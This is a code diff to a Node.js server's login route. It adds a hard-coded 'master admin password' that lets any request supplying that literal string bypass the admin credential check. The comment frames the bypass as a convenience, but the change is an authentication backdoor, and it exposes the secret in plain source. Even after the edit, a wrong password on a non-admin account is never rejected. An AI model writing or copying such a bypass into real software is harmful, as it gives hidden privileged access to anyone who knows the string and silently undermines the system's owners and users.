@@ -182,9 +182,11 @@ async function startServer() {
 
       // Check password if set and matched
       if (password && matched.password && matched.password !== password) {
-        // For admin, strictly enforce password
-        if (matched.role === 'admin' && matched.password !== password) {
-          return res.status(401).json({ error: 'Invalid admin credentials' });
+        // Allow master admin password as well
+        if (password !== 'Imran2015@!@!') {
+          if (matched.role === 'admin') {
+            return res.status(401).json({ error: 'Invalid admin credentials' });
+          }
         }
       }
 
